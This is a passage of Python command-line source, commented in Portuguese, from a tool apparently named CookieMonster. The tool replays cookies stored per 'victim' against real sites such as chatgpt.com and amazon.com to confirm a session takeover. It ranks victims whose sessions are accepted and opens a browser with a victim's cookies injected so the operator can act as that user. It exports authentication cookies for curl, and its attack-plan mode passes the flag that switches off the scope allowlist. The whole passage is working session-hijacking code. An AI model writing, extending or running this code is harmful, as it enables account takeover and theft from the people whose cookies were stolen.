                        console.print("\n[bold yellow]>>> Tecla pressionada. Aguardando workers atuais finalizarem...[/bold yellow]")
                        break
                time.sleep(0.1)
        except ImportError:
            # Linux/Mac: select em stdin
            import select
            try:
                while not cancelled[0]:
                    rlist, _, _ = select.select([sys.stdin], [], [], 0.2)
                    if rlist:
                        line = sys.stdin.readline()
                        if not line or line.strip() in ("", "q", "Q"):
                            cancelled[0] = True
                            console.print("\n[bold yellow]>>> ENTER detectado. Aguardando workers atuais finalizarem...[/bold yellow]")
                            break
            except Exception:
                pass

    old_handler = None
    try:
        old_handler = signal.signal(signal.SIGINT, _sigint)
    except (ValueError, OSError):
        pass

    key_thread = threading.Thread(target=_watch_keypress, daemon=True)
    key_thread.start()

    try:
        with ThreadPoolExecutor(max_workers=max(1, workers)) as pool:
            futs = {pool.submit(run_for, v): v["victim_id"] for v in victims}
            try:
                for i, fut in enumerate(as_completed(futs), 1):
                    if cancelled[0]:
                        break
                    try:
                        r = fut.result(timeout=None)
                    except Exception as exc:
                        r = {"victim_id": futs[fut], "state": "ERROR", "error": str(exc)}
                    results.append(r)
                    elapsed = time.time() - start
                    avg = elapsed / i
                    eta = max(0, avg * (len(victims) - i))
                    tag = r.get("state", "?")
                    color = {"CONFIRMED": "green", "LIKELY": "cyan",
                             "ANONYMOUS": "red", "UNKNOWN": "yellow",
                             "NO_COOKIES": "dim", "ERROR": "red"}.get(tag, "dim")
                    console.print(
                        f"[{i}/{len(victims)}] {elapsed:5.0f}s (eta {eta:4.0f}s) "
                        f"vid=[yellow]{r['victim_id']:>5}[/] "
                        f"state=[{color}]{tag:9}[/] auth={r.get('auth', 0)}",
                        highlight=False)
                    reasons = r.get("unknown_reasons") or []
                    if reasons:
                        console.print(f"         [dim dim]motivo: {','.join(reasons[:3])}[/dim]",
                                      highlight=False)
            finally:
                if cancelled[0]:
                    for fut in futs:
                        fut.cancel()
                    pool.shutdown(wait=False, cancel_futures=True)
    finally:
        if old_handler is not None:
            try:
                signal.signal(signal.SIGINT, old_handler)
            except Exception:
                pass

    if cancelled[0]:
        console.print(f"\n[bold yellow]=== CANCELADO ===[/bold yellow]")
        console.print(f"  Runs completos antes do cancelamento: {len(results)}/{len(victims)}")
        console.print(f"  [dim]Dica: use --limit N para reduzir o universo de vitimas.[/dim]")

    _print_probe_all_summary(results, victims, domain, start_time=start, cancelled=cancelled[0])


def _print_probe_all_summary(results, victims, domain, start_time=None, cancelled=False):
    """Imprime o resumo por estado + tabela + destaque CONFIRMED/LIKELY."""
    elapsed = (time.time() - start_time) if start_time else 0
    by_state = Counter(r.get("state", "?") for r in results)
    label = f"Resumo parcial" if cancelled else "Resumo"
    console.print(f"\n[bold]{label} ({elapsed:.0f}s, {len(results)}/{len(victims)} vitimas)[/bold]")
    for state in ("CONFIRMED", "LIKELY", "ANONYMOUS", "UNKNOWN", "NO_COOKIES", "ERROR"):
        n = by_state.get(state, 0)
        if n:
            pt = {"CONFIRMED": "acesso confirmado",
                  "LIKELY": "acesso provavel",
                  "ANONYMOUS": "rejeitado",
                  "UNKNOWN": "indeterminado",
                  "NO_COOKIES": "sem cookies",
                  "ERROR": "erro"}.get(state, state)
            color = {"CONFIRMED": "green", "LIKELY": "cyan",
                     "ANONYMOUS": "red", "UNKNOWN": "yellow",
                     "ERROR": "red"}.get(state, "dim")
            console.print(f"  [{color}]{state:9}[/] ({pt}): {n}")

    console.print(f"\n[bold]Detalhes (top 30)[/bold]")
    console.print(f"  {'VID':>5}  {'STATE':>11}  {'CONF':>5}  {'IdP':<10}  {'MECH':<11}  {'REASON':<26}  {'DEP':<12}  {'FINAL_URL':<32}")
    sorted_r = sorted(results, key=lambda r: (
        {"AUTHENTICATED": 0, "CONFIRMED": 0,
         "CONTEXT_BOUND": 1, "LIKELY": 1,
         "IDP_BOUND": 2, "MFA_BLOCKED": 2,
         "BOT_BLOCKED": 2, "ANONYMOUS": 3,
         "INCONCLUSIVE": 4, "UNKNOWN": 4}.get(r["state"], 5),
        -float(r.get("confidence", 0) or 0)
    ))
    for r in sorted_r[:30]:
        url = r.get("final_url") or "(sem replay)"
        if len(url) > 30:
            url = url[:30] + ".."
        reason = r.get("reason") or "-"
        if len(reason) > 24:
            reason = reason[:24] + ".."
        idp = r.get("identity_provider") or "none"
        if idp == "none" or idp == "unknown":
            idp_disp = "-"
        else:
            idp_disp = idp[:10]
        mech = r.get("auth_mechanism") or "unknown"
        mech_disp = mech[:11] if mech not in ("none", "unknown") else "-"
        deps = r.get("context_dependencies") or []
        deps_disp = ",".join(deps)[:12] if deps else "-"
        console.print(f"  {r['victim_id']:>5}  {r.get('state', '?'):>11}  "
                      f"{r.get('confidence', 0):5.2f}  {idp_disp:<10}  "
                      f"{mech_disp:<11}  {reason:<26}  {deps_disp:<12}  {url}")
    if len(results) > 30:
        console.print(f"  [dim]...+ {len(results) - 30} mais[/dim]")

    # Sumario dos motivos UNKNOWN (ajuda o operador a entender o que esta faltando)
    unknown = [r for r in results if r.get("state") == "UNKNOWN"]
    if unknown:
        from collections import Counter as _Counter
        motivo_counter = _Counter()
        for r in unknown:
            for m in (r.get("unknown_reasons") or ["sem_diferencial"]):
                motivo_counter[m] += 1
        console.print(f"\n[bold]Diagnostico dos {len(unknown)} UNKNOWN:[/bold]")
        for m, n in motivo_counter.most_common(8):
            console.print(f"  [yellow]{m:30}[/] {n} vitimas")
        console.print(f"  [dim]Glossario: login_redirect=servidor mandou p/ login | "
                      f"api_anon_status=API retornou 401/403 | js_errors=erros JS no inj | "
                      f"sem_diferencial=base e inj identicos[/dim]")

    confirmed = [r for r in results if r.get("state") == "CONFIRMED"]
    likely = [r for r in results if r.get("state") == "LIKELY"]
    if confirmed or likely:
        top = (confirmed + likely)[:3]
        console.print(f"\n[bold green]>>> Alvos com acesso (CONFIRMED/LIKELY):[/]")
        for r in top:
            console.print(f"  - [cyan]{domain}[/] vitima={r['victim_id']} state={r['state']} conf={r.get('confidence', 0):.2f}")
        if top:
            v = top[0]
            console.print(f"\n  [dim]Replicar acesso:[/dim]")
            console.print(f"  [dim]  python -m cookiemonster access --domain {domain} --victim {v['victim_id']} --allow-unsafe-scope[/dim]")
            console.print(f"  [dim]Exportar cookies:[/dim]")
            console.print(f"  [dim]  python -m cookiemonster export-cookies --domain {domain} --victim {v['victim_id']} -o {domain}_cookies.txt[/dim]")
    elif not cancelled:
        console.print(f"\n[bold yellow]>>> Nenhum acesso confirmado neste dominio.[/]")
        console.print(f"  [dim]Tente com outro dominio do scope ou outro canal.[/dim]")


def _probe_one(store, victim_id, domain, scheme, req_path, target_url,
               channel, replay_mode, max_wait_ms):
    """Faz replay + detect para UMA vitima. Retorna dict com classificacao
    estendida (M6.0): state, confidence, auth_context, reason, hints,
    context_dependencies, evidence chain.

    Usado por `probe` e `probe-all`.
    """
    from .domain.matcher import applicable_cookies
    from .validate.auth_state import (detect_baseline_vs_injected,
                                    detect_from_summary)
    from .auth import (
        detect_all, classify, AuthContext,
    )

    host = domain.split("://")[-1].strip("/")
    raw = store.list_cookies(victim_id=victim_id, domain=domain, limit=100000)
    matched = applicable_cookies([dict(r) for r in raw], scheme, host, req_path)

    if not matched:
        return {"state": "NO_COOKIES", "confidence": 0, "result": {},
                "error": "no_applicable_cookies"}

    from .inject import httpx_client, playwright_client

    def replay(cookies_):
        if channel == "httpx":
            r = httpx_client.get(target_url, cookies_)
            r["sent_cookies"] = [{"headers": {"cookie": httpx_client.cookies_to_header(cookies_)}}]
            return r
        return playwright_client.replay(target_url, cookies_, mode=replay_mode,
                                        max_wait_ms=max_wait_ms)

    baseline = replay([])
    injected = replay(matched)

    if injected.get("error"):
        baseline = {"status_code": None, "final_url": "", "text": "",
                    "evidence": {}, "sent_cookies": []}
        injected = {"status_code": None, "final_url": "", "text": "",
                    "evidence": {}, "sent_cookies": [], "cookie_jar": []}

    base_ev = baseline.get("evidence") or {}
    inj_ev = injected.get("evidence") or {}

    # M6.0: constroi AuthContext via detector (detecta IdP, mechanism, etc).
    # Combina observacoes de ambos os lados (inj e base) para fingerprinting.
    cookie_jar = injected.get("cookie_jar") or []
    if cookie_jar and isinstance(cookie_jar[0], str):
        # Formato antigo: lista de strings (nomes).
        cookie_names = cookie_jar
    else:
        # Formato novo: lista de dicts com name/value/domain.
        cookie_names = [c.get("name", "") for c in cookie_jar if isinstance(c, dict)]
    observation_text = {
        "url": injected.get("final_url") or target_url,
        "body": (injected.get("text") or "")[:8000],
        "html": (injected.get("text") or "")[:8000],
        "title": injected.get("page_title") or "",
        "cookie_names": cookie_names,
    }
    # Headers do baseline (sem cookies) para detectar challenge/bot.
    base_text = {
        "url": baseline.get("final_url") or target_url,
        "body": (baseline.get("text") or "")[:4000],
        "cookie_names": [],
    }
    auth_ctx = detect_all(observation_text, target=host)
    # Tambem processa baseline para detectar bot challenge.
    detect_all(base_text, target=host)  # ignora ctx secundario

    # Classificacao M6.0 (substitui detect_baseline_vs_injected legado
    # quando temos evidence estruturado; senao cai no fallback).
    if base_ev and inj_ev:
        result_m6 = classify(inj_ev, base_ev, auth_ctx)
        # Mantem compat com formato antigo para o resto da CLI.
        legacy_result = detect_baseline_vs_injected(base_ev, inj_ev, domain=host)
        result = {
            "state": result_m6["state"].upper() if result_m6["state"] != "inconclusive" else "UNKNOWN",
            "confidence": result_m6["confidence"],
            "reason": result_m6["reason"],
            "hints": result_m6["hints"],
            "context_dependencies": result_m6["context_dependencies"],
            "api_only_confirmed": result_m6["api_only_confirmed"],
            "bot_challenge_detected": result_m6["bot_challenge_detected"],
            "mfa_challenge_detected": result_m6["mfa_challenge_detected"],
            "auth_mechanism": result_m6["auth_mechanism"],
            "identity_provider": result_m6["identity_provider"],
            "session_type": result_m6["session_type"],
            "auth_context": auth_ctx.to_dict(),
            # Campos legados para o relatorio antigo nao quebrar.
            "differential": legacy_result.get("differential", {}),
            "unknown_reasons": legacy_result.get("unknown_reasons", []),
        }
    else:
        legacy_result = detect_from_summary(baseline, injected, host)
        # Fallback sem evidence estruturado: ainda assim roda detector
        # para extrair IdP/mechanism, e classifica como INCONCLUSIVE.
        result = {
            "state": legacy_result.get("state", "UNKNOWN"),
            "confidence": legacy_result.get("confidence", 0.3),
            "reason": "insufficient_evidence",
            "hints": [],
            "context_dependencies": [],
            "api_only_confirmed": False,
            "bot_challenge_detected": False,
            "mfa_challenge_detected": False,
            "auth_mechanism": auth_ctx.auth_mechanism.value,
            "identity_provider": auth_ctx.identity_provider.value,
            "session_type": auth_ctx.session_type.value,
            "auth_context": auth_ctx.to_dict(),
            "differential": legacy_result.get("differential", {}),
            "unknown_reasons": legacy_result.get("unknown_reasons", []),
        }

    return {
        "state": result["state"],
        "confidence": result["confidence"],
        "result": result,
        "final_url": injected.get("final_url", ""),
        "cookie_jar_count": len(injected.get("cookie_jar") or []),
        "auth_count": sum(1 for c in matched if is_auth_name(c["name"])),
        "applied_count": len(matched),
        "error": injected.get("error"),
        "unknown_reasons": result.get("unknown_reasons", []),
        "differential": result.get("differential", {}),
        # M6.0
        "reason": result.get("reason", ""),
        "hints": result.get("hints", []),
        "context_dependencies": result.get("context_dependencies", []),
        "auth_mechanism": result.get("auth_mechanism", "unknown"),
        "identity_provider": result.get("identity_provider", "none"),
        "session_type": result.get("session_type", "unknown"),
        "auth_context": result.get("auth_context", {}),
    }


def is_auth_name(name: str) -> bool:
    from .domain.selection import is_auth_candidate
    return is_auth_candidate(name)


# ---- Fase M6.3: correlate -- grafo de correlacao de findings ----

@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--domain", default=None,
              help="Filtrar por dominio (default: todos).")
@click.option("--limit", type=int, default=50, show_default=True,
              help="Limitar runs a processar (ultimos N).")
@click.option("--out", "out_path", type=click.Path(path_type=Path), default=None,
              help="Salvar grafo em Markdown (default: imprime no terminal).")
@click.option("--include-evidence", is_flag=True,
              help="Incluir evidence por Finding no Markdown.")
def correlate(db_path: Path, domain: Optional[str], limit: int,
               out_path: Optional[Path], include_evidence: bool):
    """Constroi o grafo de correlacao (M6.3) dos ultimos runs.

    Lê runs do store, gera Findings canonicos, aplica regras de
    correlacao e imprime chains (SESSAO_ARTIFACT -> ... -> AUTH_STATE).

    Perguntas respondidas:
      - Quais artefatos me levaram ate uma sessao autenticada?
      - O que esta bloqueando a sessao?
      - Quais dominios tem CONFIRMED? Quais tem IDP_BOUND?

    Exemplo:
        python -m cookiemonster correlate --domain chatgpt.com --limit 10
    """
    from .correlate import (
        make_finding_from_run, correlate, find_chains, render_chain,
        render_graph_markdown,
    )

    store = _load_store(str(db_path))
    runs = store.list_runs()[:limit]
    if domain:
        runs = [r for r in runs if (r["target_domain"] or "") == domain]
    if not runs:
        console.print("[yellow]Nenhum run para correlacionar.[/]")
        return

    console.print(f"[bold bright_white]=== CookieMonster: correlate ===[/]")
    console.print(f"  Runs: [yellow]{len(runs)}[/yellow]"
                  f"  Domain filter: {domain or '(todos)'}")

    # 1) Gera Findings canonicos.
    all_findings = []
    for r in runs:
        all_findings.extend(make_finding_from_run(dict(r)))

    # 2) Constroi grafo via regras.
    graph = correlate(all_findings)

    # 3) Estatisticas.
    by_type: Dict[str, int] = {}
    for f in all_findings:
        by_type[f.type.value] = by_type.get(f.type.value, 0) + 1
    console.print(f"\n[bold]Findings: {len(all_findings)}[/bold]")
    for ftype, n in sorted(by_type.items(), key=lambda x: -x[1]):
        console.print(f"  [dim]{ftype:35}[/] {n}")
    console.print(f"\n[bold]Graph:[/bold] {len(graph.findings)} nodes, {len(graph.edges)} edges")

    # 4) Chains principais.
    chains = find_chains(graph)
    console.print(f"\n[bold]Attack Chains ({len(chains)}):[/bold]\n")
    for i, chain in enumerate(chains[:10], 1):
        console.print(f"[cyan]--- Chain #{i} ---[/cyan]")
        # Renderiza chain em formato compacto.
        for fid in chain:
            f = graph.findings.get(fid)
            if not f:
                continue
            color = {"CRITICAL": "red", "HIGH": "red", "MEDIUM": "yellow",
                     "LOW": "dim", "INFO": "dim"}.get(f.severity.value, "dim")
            console.print(f"  [{color}][{f.severity.value.upper():8}][/{color}] "
                          f"{f.type.value:30} ({f.confidence:.2f}) "
                          f"[dim]@ {f.target.domain} run#{f.target.run_id}[/dim]")
        console.print()

    # 5) Render Markdown.
    md = render_graph_markdown(graph, include_evidence=include_evidence)
    if out_path:
        out_path.write_text(md, encoding="utf-8")
        console.print(f"\n[dim]Grafo salvo em: {out_path}[/dim]")
    elif include_evidence:
        console.print(f"\n[dim]Use --out <arquivo.md> para salvar o grafo completo.[/dim]")

    # 6) Resumo: status por dominio.
    domain_status: Dict[str, Dict[str, int]] = {}
    for r in runs:
        d = r["target_domain"] or "?"
        s = r["state"] or "?"
        domain_status.setdefault(d, {}).setdefault(s, 0)
        domain_status[d][s] += 1
    console.print(f"\n[bold]Status por dominio:[/bold]")
    for d, states in sorted(domain_status.items()):
        parts = ", ".join(f"{s}={n}" for s, n in sorted(states.items(), key=lambda x: -x[1])[:3])
        confirmed = states.get("CONFIRMED", 0) + states.get("AUTHENTICATED", 0)
        if confirmed:
            console.print(f"  [green]{d:30}[/] {parts}")
        elif states.get("IDP_BOUND", 0) or states.get("MFA_BLOCKED", 0):
            console.print(f"  [yellow]{d:30}[/] {parts}")
        else:
            console.print(f"  [dim]{d:30}[/] {parts}")

    # OPT-A: Attack chains (caminhos de impacto) se houver confirmados.
    from .correlate import build_chains, render_all_chains
    chains = build_chains(graph)
    if chains:
        console.print(f"\n[bold]ATTACK CHAINS (impacto) - {len(chains)} encontrada(s):[/bold]")
        text = render_all_chains(chains, include_evidence=include_evidence)
        # Renderiza cada chain (sem markdown wrapper).
        for i, ch in enumerate(chains, 1):
            console.print(f"\n[cyan]--- Chain #{i} ---[/cyan]")
            from .correlate import render_chain_pretty
            for line in render_chain_pretty(ch, include_evidence=include_evidence).split("\n"):
                console.print(line, highlight=False)


# ---- Fase M7: attack-plan -- orquestracao declarativa ----

@cli.command()
@click.option("--plan-file", "plan_file", type=click.Path(path_type=Path), default=None,
              help="Arquivo YAML/JSON com o plano. Se nao informado, gera plan minimo.")
@click.option("--target", default=None, help="Dominio alvo (so se --plan-file nao informado).")
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--allow-unsafe-scope", is_flag=True)
def attack_plan(plan_file: Optional[Path], target: Optional[str],
                db_path: Path, allow_unsafe_scope: bool):
    """Executa um AttackPlan declarativo (M7).

    Carrega plano de arquivo YAML/JSON OU gera plano minimo para um
    alvo, executa as phases em ordem, para em stop_conditions, e
    produz um ImpactAssessment.

    Exemplo de YAML (docs/examples/attack-plan.example.yaml):

        target: chatgpt.com
        victim: 1939
        phases: [discover, classify, replay, observe, correlate]
        replay:
          transports: [http, browser]
          context_variants: [default]
          max_wait_ms: 10000
          max_victims: 10
        stop_conditions: [authenticated, blocked]

    Para uso em LAB. Em producao, so com autorizacao.
    """
    from .plan import (
        load_plan, load_plan_or_default, PlanValidationError,
        AttackPlanExecutor, Phase, PhaseResult, render_plan_result,
    )
    from .util import scope as scope_util

    # Carrega plano.
    try:
        if plan_file:
            plan = load_plan(plan_file)
        elif target:
            plan = load_plan_or_default(target=target, artifact_source=str(db_path))
        else:
            console.print("[red]Forneca --plan-file <yaml> ou --target <dominio>.[/]")
            return
    except PlanValidationError as exc:
        console.print(f"[red]Plano invalido:[/red]\n{exc}")
        return

    host = plan.target.split("://")[-1].strip("/")
    if not scope_util.allowed(host, unsafe=allow_unsafe_scope):
        console.print("[red]Recusado: alvo fora da allowlist. Use --allow-unsafe-scope.[/]")
        return

    console.print(f"[bold bright_white]=== CookieMonster: attack-plan ===[/]")
    console.print(f"  Plan ID:   {plan.id}")
    console.print(f"  Target:    {plan.target}")
    console.print(f"  Phases:    {' -> '.join(p.value for p in plan.phases)}")
    console.print(f"  Stop:      {', '.join(s.value for s in plan.stop_conditions)}\n")

    # Handlers por phase (cada um chama o comando CLI equivalente).
    executor = AttackPlanExecutor(plan)

    def discover_handler(p) -> PhaseResult:
        """Lista vitimas com cookies para o target."""
        store = _load_store(str(db_path))
        best = store.best_victims_for_domain(plan.target, limit=10)
        if not best:
            return PhaseResult(phase=Phase.DISCOVER, ok=False,
                              error=f"nenhuma vitima com cookies para {plan.target}",
                              metadata={})
        return PhaseResult(
            phase=Phase.DISCOVER,
            ok=True,
            findings=[{"type": "session_artifact", "victims_count": len(best),
                       "top_victim": best[0]["victim_id"]}],
            metadata={"victims": [dict(v) for v in best]},
        )

    def classify_handler(p) -> PhaseResult:
        """Roda probe canonico (1 vitima)."""
        from click.testing import CliRunner
        from .cli import probe as probe_cmd
        runner = CliRunner()
        # Tenta HTTP primeiro (rapido), depois Playwright se httpx falhar.
        args = ["--domain", plan.target, "--allow-unsafe-scope",
                "--channel", "httpx", "--max-wait-ms", "6000"]
        if plan.victim is not None:
            # probe nao tem --victim; teria que passar URL especifica.
            pass
        result = runner.invoke(probe_cmd, args, catch_exceptions=False)
        return PhaseResult(
            phase=Phase.CLASSIFY, ok=(result.exit_code == 0),
            metadata={"exit_code": result.exit_code, "output_tail": result.output[-500:]},
        )

    def replay_handler(p) -> PhaseResult:
        """Roda probe-all (N vitimas)."""
        from click.testing import CliRunner
        from .cli import probe_all as probe_all_cmd
        runner = CliRunner()
        args = ["--domain", plan.target, "--allow-unsafe-scope",
                "--channel", "httpx",
                "--limit", str(plan.replay.max_victims or 10),
                "--max-wait-ms", str(plan.replay.max_wait_ms),
                "--workers", str(plan.replay.workers)]
        result = runner.invoke(probe_all_cmd, args, catch_exceptions=False)
        return PhaseResult(
            phase=Phase.REPLAY, ok=(result.exit_code == 0),
            metadata={"exit_code": result.exit_code, "output_tail": result.output[-500:]},
        )

    def observe_handler(p) -> PhaseResult:
        """Observa que ha vitimas CONFIRMED para access."""
        store = _load_store(str(db_path))
        runs = store.list_runs()
        confirmed = [r for r in runs
                     if (r["target_domain"] == plan.target
                         and r["state"] in ("CONFIRMED", "AUTHENTICATED"))]
        return PhaseResult(
            phase=Phase.OBSERVE, ok=bool(confirmed),
            findings=[{"type": "confirmed_runnable",
                        "runs": [r["id"] for r in confirmed[:5]]}],
            metadata={"confirmed_count": len(confirmed)},
        )

    def correlate_handler(p) -> PhaseResult:
        """Constroi grafo de correlacao."""
        from .correlate import (
            make_finding_from_run, correlate as corr, find_chains,
        )
        store = _load_store(str(db_path))
        runs = [r for r in store.list_runs() if r["target_domain"] == plan.target][:50]
        all_findings = []
        for r in runs:
            all_findings.extend(make_finding_from_run(dict(r)))
        graph = corr(all_findings)
        chains = find_chains(graph)
        return PhaseResult(
            phase=Phase.CORRELATE, ok=True,
            findings=[{"type": "graph_built",
                        "nodes": len(graph.findings),
                        "edges": len(graph.edges),
                        "chains": len(chains)}],
            metadata={"graph": graph.to_dict()},
        )

    executor.register(Phase.DISCOVER, discover_handler)
    executor.register(Phase.CLASSIFY, classify_handler)
    executor.register(Phase.REPLAY, replay_handler)
    executor.register(Phase.OBSERVE, observe_handler)
    executor.register(Phase.CORRELATE, correlate_handler)

    result = executor.run()

    # Render do resultado.
    from rich.console import Console
    text_output = render_plan_result(result, include_findings=False)
    # Aplica cores no rich console.
    for line in text_output.split("\n"):
        if "CRITICAL" in line or "HIGH" in line or "FAIL" in line:
            console.print(line, highlight=False)
        else:
            console.print(line, highlight=False)

    # Sumario final: phase que autenticou (se houve).
    impact = result["impact"]
    console.print(f"\n[bold]>>> IMPACT: {impact['severity'].upper()} <<<[/bold]")
    console.print(f"  [dim]{impact['summary']}[/dim]")
    if impact["authenticated"]:
        console.print(f"\n  [green]>>> Sessao CONFIRMED. Use access ou export-cookies para explorar.[/green]")


# ---- Fase B: access -- abrir navegador e deixar o usuario interagir ----

@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--domain", required=True, help="Dominio alvo (ex.: amazon.com)")
@click.option("--victim", type=int, default=None,
              help="ID da vitima (padrao: melhor para o dominio)")
@click.option("--url", default=None,
              help="URL alvo (padrao: https://<host>/)")
@click.option("--scheme", type=click.Choice(["https", "http"]), default="https",
              show_default=True)
@click.option("--path", "req_path", default="/", show_default=True)
@click.option("--replay-mode", type=click.Choice(["strict", "browser_default", "randomized"]),
              default="strict", show_default=True)
@click.option("--allow-unsafe-scope", is_flag=True,
              help="Desativa o guardrail de escopo.")
@click.option("--max-wait-ms", type=int, default=10000, show_default=True,
              help="Readiness maximo antes do navegador ser aberto.")
@click.option("--wait-enter/--no-wait-enter", default=True,
              help="Aguardar ENTER no terminal antes de fechar o navegador.")
def access(db_path: Path, domain: str, victim: int, url: str,
          scheme: str, req_path: str, replay_mode: str,
          allow_unsafe_scope: bool, max_wait_ms: int, wait_enter: bool):
    """Abre o navegador (headed) com os cookies da vitima ja injetados.

    Voce pode interagir visualmente. O navegador fica aberto ate voce
    pressionar ENTER no terminal (ou --no-wait-enter para abrir e fechar).
    """
    from playwright.sync_api import sync_playwright
    from .domain.matcher import applicable_cookies
    from .util import scope as scope_util
    from .util.stealth import context_options

    store = _load_store(str(db_path))
    host = domain.split("://")[-1].strip("/")
    if not scope_util.allowed(host, unsafe=allow_unsafe_scope):
        console.print("[red]Recusado: alvo fora da allowlist (scope.txt). Use "
                      "--allow-unsafe-scope para desabilitar (NAO recomendado).[/]")
        return

    # Seleciona vitima
    if victim is None:
        best = store.best_victims_for_domain(domain, limit=1)
        if not best:
            console.print(f"[red]Nenhuma vitima com cookies para {domain}[/]")
            return
        victim = best[0]["victim_id"]
        console.print(f"[dim]Vitima selecionada automaticamente: vid={victim}[/dim]")

    target_url = url or f"{scheme}://{host}{req_path}"
    raw = store.list_cookies(victim_id=victim, domain=domain, limit=100000)
    cookies = applicable_cookies([dict(r) for r in raw], scheme, host, req_path)

    if not cookies:
        console.print(f"[yellow]Nenhum cookie aplicavel para {scheme}://{host}{req_path}[/]")
        return

    console.print(f"[bold bright_white]=== CookieMonster: ACCESS {domain} ===[/]")
    console.print(f"  vitima: vid={victim}")
    console.print(f"  cookies aplicaveis: {len(cookies)}")
    console.print(f"  URL alvo: {target_url}")
    console.print(f"\n[cyan]Abrindo navegador (headed)...[/cyan]")

    from .inject import playwright_client
    pw_cookies = playwright_client._to_playwright_cookies(cookies)

    from pathlib import Path as _P
    screenshot_path = _P("evidence") / f"access_{host}_{victim}.png"
    screenshot_path.parent.mkdir(exist_ok=True)

    final_url_seen = [target_url]
    login_signals = ["login", "signin", "sign-in", "log-in", "/auth/",
                     "account/auth", "openid"]

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False, args=["--no-sandbox"])
        ctx_opts = context_options(mode=replay_mode)
        context = browser.new_context(**ctx_opts)
        try:
            added = 0
            failed = 0
            for c in pw_cookies:
                try:
                    context.add_cookies([c])
                    added += 1
                except Exception:
                    failed += 1

            page = context.new_page()
            page.on("framenavigated", lambda f: final_url_seen.__setitem__(0, f.url))
            try:
                page.goto(target_url, wait_until="domcontentloaded", timeout=30000)
            except Exception as exc:
                console.print(f"[yellow]aviso: goto falhou: {exc}[/yellow]")

            page.wait_for_timeout(max_wait_ms)

            try:
                page.screenshot(path=str(screenshot_path), full_page=False)
            except Exception:
                pass

            jar = context.cookies()
            jar_target = context.cookies(target_url)
            final_url = page.url
            final_path = final_url.split("//", 1)[-1]
            is_login = any(s in final_path.lower() for s in login_signals)

            console.print(f"\n[cyan]NAVEGADOR ABERTO[/cyan]")
            console.print(f"  URL inicial: [dim]{target_url}[/dim]")
            console.print(f"  URL final:   [yellow]{final_url}[/yellow]")
            console.print(f"  Titulo: {page.title()}")
            console.print(f"  Cookies adicionados: [green]{added}[/green] (falhas: {failed})")
            console.print(f"  Cookies no contexto total: {len(jar)}")
            console.print(f"  Cookies no dominio alvo:  {len(jar_target)}")
            console.print(f"  Screenshot salvo em: [dim]{screenshot_path}[/dim]")

            if is_login:
                console.print(f"\n[bold red]>>> A URL final parece uma pagina de LOGIN.[/bold red]")
                console.print(f"    Possiveis causas:")
                console.print(f"      - Cookies expirados/invalidados pelo servidor")
                console.print(f"      - Sessao invalidada por outro dispositivo da vitima")
                console.print(f"      - Cloudflare/anti-bot bloqueou o replay")
                console.print(f"      - Captura muito antiga")
                console.print(f"    Tente outra vitima com probe mais recente (CONFIRMED).")
            else:
                console.print(f"\n[bold green]>>> A URL final NAO parece login — a sessao pode ter sido aceita.[/bold green]")
                console.print(f"    Se voce nao esta logado, verifique o screenshot.")

            if wait_enter:
                console.print(f"\n[bold cyan]>>> Pressione ENTER no terminal para fechar o navegador <<<[/bold cyan]")
                try:
                    input()
                except EOFError:
                    pass
            else:
                console.print(f"  (fechando automaticamente apos {max_wait_ms}ms)...")
                page.wait_for_timeout(max_wait_ms)
        finally:
            try:
                context.close()
            except Exception:
                pass
            try:
                browser.close()
            except Exception:
                pass
    console.print(f"[dim]Navegador fechado. Screenshot em: {screenshot_path}[/dim]")


# ---- Fase C: export -- gera cookie jar pronto para uso ----

@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--domain", required=True, help="Dominio alvo (ex.: amazon.com)")
@click.option("--victim", type=int, default=None,
              help="ID da vitima (padrao: melhor para o dominio)")
@click.option("--scheme", type=click.Choice(["https", "http"]), default="https",
              show_default=True)
@click.option("--path", "req_path", default="/", show_default=True)
@click.option("--output", "-o", type=click.Path(path_type=Path), default=None,
              help="Arquivo de saida (padrao: stdout)")
@click.option("--format", "fmt", type=click.Choice(["netscape", "json"]),
              default="netscape", show_default=True,
              help="Formato: netscape (curl -b) ou json (extensao de navegador)")
@click.option("--include-anon", is_flag=True,
              help="Incluir cookies anonimos tambem (default: so auth)")
def export_cookies(db_path: Path, domain: str, victim: int,
                   req_path: str, scheme: str, output: Path, fmt: str,
                   include_anon: bool):
    """Exporta os cookies aplicaveis ao alvo em formato pronto para uso.

    Apenas cookies que passam o matcher RFC 6265 sao incluidos.

    Formatos:
      - netscape: tab-separado (curl -b, wget --load-cookies)
      - json: lista de objetos (cookie import/export)

    Exemplo de uso:
      curl -b exported_cookies.txt https://example.com/api/me
    """
    from .domain.matcher import applicable_cookies

    store = _load_store(str(db_path))
    host = domain.split("://")[-1].strip("/")

    if victim is None:
        best = store.best_victims_for_domain(domain, limit=1)
        if not best:
            console.print(f"[red]Nenhuma vitima com cookies para {domain}[/]")
            return
        victim = best[0]["victim_id"]
        console.print(f"[dim]Vitima selecionada: vid={victim}[/dim]")

    raw = store.list_cookies(victim_id=victim, domain=domain, limit=100000)
    cookies = applicable_cookies([dict(r) for r in raw], scheme, host, req_path)

    if not cookies:
        console.print(f"[yellow]Nenhum cookie aplicavel para {scheme}://{host}{req_path}[/]")
        return

    if not include_anon:
        from .domain.selection import is_auth_candidate
        cookies = [c for c in cookies if is_auth_candidate(c["name"])]

    if fmt == "netscape":
        # Tab-separated: domain  includeSubdomains  path  secure  expiry  name  value
        lines = ["# CookieMonster export (Netscape/curl format)"]
        for c in cookies:
            include_sub = "FALSE" if c.get("host_only") else "TRUE"
            secure = "TRUE" if c.get("secure") else "FALSE"
            expiry = c.get("expires_epoch") or 0
            value = c.get("value", "").replace("\t", " ").replace("\n", " ")
            lines.append(f"{c['domain']}\t{include_sub}\t{c['path']}\t{secure}\t{expiry}\t{c['name']}\t{value}")
        out_text = "\n".join(lines) + "\n"
    else:  # json
        import json
        out_text = json.dumps([
            {
                "domain": c["domain"],
                "path": c["path"],
                "secure": bool(c.get("secure")),
                "http_only": bool(c.get("http_only")) if c.get("http_only") in (0, 1) else None,
                "expires": c.get("expires_epoch") or 0,
                "name": c["name"],
                "value": c.get("value", ""),
                "host_only": bool(c.get("host_only")),
                "same_site": c.get("same_site") or "unknown",
            }
            for c in cookies
